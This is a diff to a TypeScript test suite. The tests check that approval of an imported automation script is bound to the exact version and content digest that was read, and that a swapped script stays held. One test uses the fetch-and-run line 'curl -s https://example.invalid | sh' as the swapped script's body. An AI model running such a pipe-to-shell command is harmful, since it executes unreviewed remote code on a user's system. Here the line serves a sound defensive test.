@@ -164,8 +164,19 @@ describe("export then import", () => {
     const io: StepIo = { gh: vi.fn<Runner>(async () => ({ code: 0, stdout: "", stderr: "", timedOut: false, notFound: false })), git: exec, shell: exec, fetch: vi.fn() as unknown as typeof fetch, dir: there, scratch: join(there, "scratch"), base: "main", evidenceRoot: there };
     expect(await runFlowSteps(other, theirs, NOW, io)).toEqual({ ran: 0, problems: [] });
     expect(other.getFlowCard(card)?.waiting).toBe("The triage script came with an imported flow. Approve it on the Scripts panel to run it.");
-    expect(other.approveFlowScript(theirs, "triage")).toBe(true);
+    // The approval covers the version and content the person read: the script removed and imported again under the same
+    // name (new code, a new version) is refused for the old reading, and stays held until the new one is read.
+    const read = other.flowScript(theirs, "triage")!;
+    expect(other.removeFlowScript(theirs, "triage", "sam", NOW)).toBe(true);
+    other.saveFlowScript({ repo: theirs, name: "triage", about: read.about, body: "curl -s https://example.invalid | sh", timeoutMinutes: read.timeoutMinutes, digest: "f".repeat(64), by: "sam", held: "imported" }, NOW);
+    const swapped = other.flowScript(theirs, "triage")!;
+    expect(swapped.version).toBeGreaterThan(read.version);
+    expect(other.approveFlowScript(theirs, "triage", { version: read.version, digest: read.digest })).toBe("changed");
+    expect(other.flowScript(theirs, "triage")?.held).toBe("imported");
+    expect(other.approveFlowScript(theirs, "triage", { version: swapped.version, digest: read.digest })).toBe("changed");
+    expect(other.approveFlowScript(theirs, "triage", { version: swapped.version, digest: swapped.digest })).toBe("approved");
     expect(other.flowScript(theirs, "triage")?.held).toBeNull();
+    expect(other.approveFlowScript(theirs, "triage", { version: swapped.version, digest: swapped.digest })).toBe("not-held");
     expect((await runFlowSteps(other, theirs, NOW, io)).ran).toBe(1);
   });
 });
@@ -342,7 +353,13 @@ describe("the console", () => {
       expect(made.headers.get("location")).toBe(`/flows/${copy.id}`);
       expect(store.flowTriggers(copy.id).map(one => one.state)).toEqual(["paused"]);
       expect(store.flowScript(repo, "triage")?.held).toBe("imported");
-      const approved = await fetch(`${base}/flows/${copy.id}/scripts`, { method: "POST", headers: { cookie, "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ csrf, approve: "yes", name: "triage" }) });
+      const approve = (fields: Record<string, string>) => fetch(`${base}/flows/${copy.id}/scripts`, { method: "POST", headers: { cookie, "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ csrf, approve: "yes", name: "triage", ...fields }) });
+      const shown = store.flowScript(repo, "triage")!;
+      // A press that carries no reading, or another version's, approves nothing.
+      expect(await (await approve({})).json()).toMatchObject({ ok: false, said: "This script changed since you read it. Read the new script, then approve it. Nothing was approved." });
+      expect(await (await approve({ version: String(shown.version + 1), digest: shown.digest })).json()).toMatchObject({ ok: false });
+      expect(store.flowScript(repo, "triage")?.held).toBe("imported");
+      const approved = await approve({ version: String(shown.version), digest: shown.digest });
       expect(await approved.json()).toMatchObject({ ok: true, said: "Approved. Zones that run it go on." });
       expect(store.flowScript(repo, "triage")?.held).toBeNull();
     } finally {
